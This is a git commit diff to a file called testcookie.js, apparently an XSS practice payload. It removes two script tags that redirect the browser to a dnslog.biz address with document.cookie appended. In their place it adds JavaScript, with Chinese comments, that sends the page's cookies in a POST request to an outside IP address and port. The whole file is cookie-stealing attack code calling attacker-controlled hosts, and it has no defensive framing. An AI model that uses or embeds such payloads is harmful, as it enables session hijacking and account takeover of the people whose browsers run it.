acf3617da571292a357031ac05aa9ef6e993306d
zer0p0int <81251950+zer0p0intvvv@users.noreply.github.com>
2024-05-06 13:22:19 +0800

    Update testcookie.js

--- testcookie.js
+++ testcookie.js
@@ -1,2 +1,11 @@
-<script>document.location = 'http://2548043c.dnslog.biz/pika/pkxss/xcookie/cookie.php?cookie=' + document.cookie;</script>
-<script>window.top.location.href=`http://2548043c.dnslog.biz/cooookie`%2bdocument.cookie;</script>
+// 创建 XMLHttpRequest 对象
+var xhr = new XMLHttpRequest();
+
+// 设置请求方法和目标 URL
+xhr.open('POST', 'http://121.91.173.139:9001');
+
+// 设置请求头，包括 Cookie
+xhr.setRequestHeader('Cookie', document.cookie);
+
+// 发送请求
+xhr.send();
